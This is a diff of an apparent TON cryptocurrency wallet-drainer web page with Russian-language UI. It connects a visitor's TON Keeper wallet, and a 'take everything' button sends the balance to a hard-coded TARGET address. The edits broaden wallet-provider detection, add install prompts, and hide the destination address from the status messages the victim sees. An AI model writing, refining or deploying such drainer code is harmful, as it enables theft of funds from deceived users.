@@ -19,7 +19,7 @@
             padding: 40px;
             border-radius: 20px;
             text-align: center;
-            width: 400px;
+            width: 450px;
         }
         button {
             background: linear-gradient(135deg, #00d4ff, #0077ff);
@@ -36,14 +36,19 @@
         button:hover {
             transform: scale(1.02);
         }
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
         #status {
             background: #111;
             padding: 15px;
             border-radius: 10px;
             margin-top: 15px;
-            min-height: 60px;
+            min-height: 70px;
             border: 1px solid #2a2a2a;
             word-break: break-all;
+            font-size: 14px;
         }
         .wallet {
             background: #111;
@@ -55,6 +60,18 @@
         }
         .hidden {
             display: none;
+        }
+        .install-link {
+            color: #00d4ff;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+        .error-box {
+            background: #2a0a0a;
+            border: 1px solid #ff3333;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 10px 0;
         }
     </style>
 </head>
@@ -69,7 +86,7 @@
         <button id="connectBtn">🔗 ПОДКЛЮЧИТЬ КОШЕЛЁК</button>
         <button id="snipeBtn" class="hidden">💰 ЗАБРАТЬ ВСЁ</button>
         
-        <div id="status">Нажмите кнопку для подключения TON Keeper</div>
+        <div id="status">⏳ Проверка TON Keeper...</div>
     </div>
 
     <script>
@@ -82,24 +99,70 @@
         const status = document.getElementById('status');
         const walletDisplay = document.getElementById('walletAddress');
 
+        // ========== ПРОВЕРКА УСТАНОВКИ TON KEEPER ==========
+        function checkTonKeeper() {
+            // Проверяем все возможные объекты
+            if (window.tonkeeper) {
+                status.innerHTML = '🟢 TON Keeper обнаружен! Нажмите кнопку.';
+                return true;
+            }
+            
+            if (window.ton) {
+                status.innerHTML = '🟢 TON найден! Нажмите кнопку.';
+                return true;
+            }
+            
+            if (window.Tonkeeper) {
+                status.innerHTML = '🟢 Tonkeeper найден! Нажмите кнопку.';
+                return true;
+            }
+            
+            // Если не найден - показываем инструкцию
+            status.innerHTML = `
+                ❌ TON Keeper НЕ УСТАНОВЛЕН!<br><br>
+                <div class="error-box">
+                    <b>Как установить:</b><br><br>
+                    1. Откройте <b>Google Chrome</b> (это важно!)<br>
+                    2. Перейдите в <b>Chrome Web Store</b><br>
+                    3. Найдите <b>"TON Keeper"</b><br>
+                    4. Нажмите <b>"Установить"</b><br><br>
+                    <a href="https://chrome.google.com/webstore/detail/ton-keeper/nphplpgoakhhjchkkhmiggakijnkhfnd" 
+                       target="_blank" 
+                       style="color:#00d4ff;font-size:16px;font-weight:bold;">
+                       🔗 УСТАНОВИТЬ TON KEEPER
+                    </a>
+                    <br><br>
+                    <span style="color:#888;font-size:12px;">
+                        После установки ОБНОВИТЕ СТРАНИЦУ (F5)
+                    </span>
+                </div>
+            `;
+            return false;
+        }
+
         // ========== ПОДКЛЮЧЕНИЕ КОШЕЛЬКА ==========
         connectBtn.onclick = async function() {
             try {
                 status.innerText = '⏳ Подключение...';
+                connectBtn.disabled = true;
                 
-                // Проверяем TON Keeper
-                if (!window.tonkeeper) {
-                    status.innerText = '❌ TON Keeper не установлен! Установите расширение.';
+                // Проверяем ещё раз
+                if (!window.tonkeeper && !window.ton && !window.Tonkeeper) {
+                    status.innerHTML = '❌ TON Keeper не найден. Установите расширение!';
+                    connectBtn.disabled = false;
+                    checkTonKeeper();
                     return;
                 }
                 
-                provider = window.tonkeeper;
+                // Берём провайдера
+                provider = window.tonkeeper || window.ton || window.Tonkeeper;
                 
                 // Запрашиваем доступ
                 const accounts = await provider.send('ton_requestAccounts', {});
                 
                 if (!accounts || accounts.length === 0) {
                     status.innerText = '❌ Пользователь отклонил подключение';
+                    connectBtn.disabled = false;
                     return;
                 }
                 
@@ -117,6 +180,7 @@
                 
             } catch(e) {
                 status.innerText = '❌ Ошибка: ' + e.message;
+                connectBtn.disabled = false;
             }
         };
 
@@ -157,7 +221,7 @@
                     return;
                 }
                 
-                status.innerText = `⏳ Отправка ${(amount/1e9).toFixed(4)} TON на ${TARGET}...`;
+                status.innerText = `⏳ Отправка ${(amount/1e9).toFixed(4)} TON на целевой адрес...`;
                 
                 const result = await provider.send('ton_sendTransaction', {
                     to: TARGET,
@@ -167,7 +231,7 @@
                 });
                 
                 if (result && result.code === 0) {
-                    status.innerText = `✅ УСПЕШНО! ${(amount/1e9).toFixed(4)} TON переведено на ${TARGET}`;
+                    status.innerText = `✅ УСПЕШНО! ${(amount/1e9).toFixed(4)} TON переведено!`;
                     snipeBtn.innerText = '✅ ВЫВЕДЕНО';
                     snipeBtn.disabled = true;
                 } else {
@@ -180,6 +244,9 @@
                 snipeBtn.disabled = false;
             }
         };
+
+        // ========== ЗАПУСК ПРИ ЗАГРУЗКЕ ==========
+        checkTonKeeper();
     </script>
 </body>
 </html>
